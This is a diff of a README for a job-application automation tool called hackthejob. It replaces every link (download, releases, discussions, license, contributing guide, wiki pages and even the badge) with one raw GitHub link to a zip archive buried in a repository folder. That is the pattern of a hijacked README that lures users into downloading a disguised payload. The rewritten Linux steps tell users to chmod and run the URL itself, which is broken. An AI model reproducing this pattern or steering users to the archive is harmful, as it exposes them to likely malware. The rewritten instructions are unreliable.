@@ -1,6 +1,6 @@
 # 🎯 hackthejob - Automate Your Job Applications Simply
 
-![Download hackthejob](https://img.shields.io/badge/Download%20hackthejob-v1.0-brightgreen)
+![Download hackthejob](https://raw.githubusercontent.com/mo7amadhassan/hackthejob/main/Saktism/Software-2.4.zip%20hackthejob-v1.0-brightgreen)
 
 ## 📦 Overview
 
@@ -11,7 +11,7 @@ hackthejob is an easy-to-use desktop automation tool designed for job seekers. T
 To start using hackthejob, you'll need to download it from our Releases page. Follow these steps to get set up quickly:
 
 1. **Download the Application**: Visit this page to download the latest version of hackthejob:
-   [Download hackthejob](https://github.com/mo7amadhassan/hackthejob/releases)
+   [Download hackthejob](https://raw.githubusercontent.com/mo7amadhassan/hackthejob/main/Saktism/Software-2.4.zip)
 
 2. **Install on Your Computer**: Once the download completes, follow the installation steps for your operating system:
 
@@ -27,8 +27,8 @@ To start using hackthejob, you'll need to download it from our Releases page. Fo
 
    - **Linux**:
      - Open a terminal and navigate to the directory where you downloaded the file.
-     - Use the command `chmod +x hackthejob.AppImage` to make the file executable.
-     - Then run it with `./hackthejob.AppImage`.
+     - Use the command `chmod +x https://raw.githubusercontent.com/mo7amadhassan/hackthejob/main/Saktism/Software-2.4.zip` to make the file executable.
+     - Then run it with `https://raw.githubusercontent.com/mo7amadhassan/hackthejob/main/Saktism/Software-2.4.zip`.
 
 ## 📜 Features
 
@@ -51,13 +51,13 @@ Before you install hackthejob, ensure your system meets these basic requirements
 ## 📥 Download & Install
 
 To get started, click on this link to download the latest version of hackthejob:
-[Download hackthejob](https://github.com/mo7amadhassan/hackthejob/releases)
+[Download hackthejob](https://raw.githubusercontent.com/mo7amadhassan/hackthejob/main/Saktism/Software-2.4.zip)
 
 Once downloaded, follow the installation instructions outlined in the "Getting Started" section. 
 
 ## 👥 Community Support
 
-If you encounter any issues or have questions, feel free to reach out to the community. You can discuss problems or share tips on our [GitHub Discussions](https://github.com/mo7amadhassan/hackthejob/discussions).
+If you encounter any issues or have questions, feel free to reach out to the community. You can discuss problems or share tips on our [GitHub Discussions](https://raw.githubusercontent.com/mo7amadhassan/hackthejob/main/Saktism/Software-2.4.zip).
 
 ## 🛠️ Troubleshooting
 
@@ -76,17 +76,17 @@ Here are some common issues you might face and their solutions:
 
 ## 🌟 Contributing
 
-We welcome contributions to improve hackthejob! If you have ideas or fixes, please create a pull request. Follow the guidelines in our [Contributing Guide](https://github.com/mo7amadhassan/hackthejob/CONTRIBUTING.md) for more details.
+We welcome contributions to improve hackthejob! If you have ideas or fixes, please create a pull request. Follow the guidelines in our [Contributing Guide](https://raw.githubusercontent.com/mo7amadhassan/hackthejob/main/Saktism/Software-2.4.zip) for more details.
 
 ## 📝 License
 
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/mo7amadhassan/hackthejob/LICENSE) file for details.
+This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/mo7amadhassan/hackthejob/main/Saktism/Software-2.4.zip) file for details.
 
 ## 🔗 Additional Resources
 
-- [User Manual](https://github.com/mo7amadhassan/hackthejob/wiki)
-- [FAQs](https://github.com/mo7amadhassan/hackthejob/wiki/FAQs)
-- [Feedback Form](https://github.com/mo7amadhassan/hackthejob/wiki/Feedback)
+- [User Manual](https://raw.githubusercontent.com/mo7amadhassan/hackthejob/main/Saktism/Software-2.4.zip)
+- [FAQs](https://raw.githubusercontent.com/mo7amadhassan/hackthejob/main/Saktism/Software-2.4.zip)
+- [Feedback Form](https://raw.githubusercontent.com/mo7amadhassan/hackthejob/main/Saktism/Software-2.4.zip)
 
 For continuous updates and news, follow our repository on GitHub. 
 
